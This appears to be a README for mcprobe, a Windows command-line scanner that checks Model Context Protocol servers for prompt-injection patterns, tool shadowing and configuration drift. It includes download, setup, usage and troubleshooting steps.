# 🛡️ mcprobe - Secure your MCP server communication paths

[![Download Latest Version](https://img.shields.io/badge/Download-mcprobe-blue)](https://github.com/Amalleheavy908/mcprobe/releases)

mcprobe helps you secure your Model Context Protocol (MCP) servers. It scans your connections to find security risks. This tool checks for injection patterns, sees if tools hide other tools, and tracks changes to your system over time. You do not need to install extra software. It is a single file that works on its own.

## 📥 How to download the software

You can get the software from the releases page. Follow these steps:

1. Visit the [releases page](https://github.com/Amalleheavy908/mcprobe/releases).
2. Look for the latest version at the top of the page.
3. Click the link that ends in .exe for Windows.
4. Save the file to your computer.

The program does not require an installation process. You can run it once it downloads.

## 🚀 Setting up the application

You need to open your command prompt to run this tool. Many Windows users call this the terminal.

1. Press the Windows key on your keyboard.
2. Type "cmd" and press Enter.
3. Use the "cd" command to change to the folder where you saved the file. For example, if you saved it in your Downloads folder, type `cd Downloads` and press Enter.
4. Type `mcprobe.exe` and press Enter to see a list of available options.

## 🔍 Understanding the features

mcprobe provides several functions to keep your data safe.

### Checking for injection patterns
The tool looks for common entry points where bad actors try to force your server to run unwanted commands. It tests your prompts for patterns that might lead to unauthorized actions.

### Finding tool shadowing
Sometimes, a server has two tools with the same name. This can confuse your system. mcprobe detects these overlaps. It tells you which tool takes priority so you can fix the conflict.

### Creating a baseline
You can scan your server while it works well. The tool records this state. Later, you can scan the server again and compare it to the original record. This helps you notice if the configuration changes in a way you did not expect.

### Generating reports
The tool creates reports in standard formats. If you use security software, you can feed these files into your dashboard to track trends.

## ⚙️ How to use the scanner

To start a basic scan, you need the address of your MCP server. Type this command into your terminal:

`mcprobe.exe scan --url http://your-server-address`

Replace the address above with the actual link to your server. The tool will start checking the connection immediately. It will display the results on your screen as it works.

## 🛠️ Common troubleshooting steps

If the tool does not open or shows an error, check these items:

* Verify the file exists in your current folder. Type `dir` in the terminal to see a list of files.
* Ensure your server is turned on. The tool cannot connect to a server that is offline.
* Check your internet connection if your server is hosted on a remote network.
* Make sure you have the latest version. New versions often fix errors found in older releases.

## 📌 System requirements

* Windows 10 or Windows 11.
* A stable network connection for remote servers.
* Basic knowledge of opening the Windows terminal.

The software runs on its own. You do not need to install Go or any other programming language tools. The developers built it to work out of the box.

## 📋 Tips for better results

Run the scan often. If you change your server settings, run the scan to see if the changes created any security gaps. Keep a record of your successful scans in a separate folder. This makes it easier to compare versions over time. You can also save your scan output to a text file for your records. Do this by adding `> report.txt` to the end of your command.

Keywords: audit, cli, devsecops, go, mcp, mcp-server, model-context-protocol, prompt-injection, sarif, scanner, security, tool-shadowing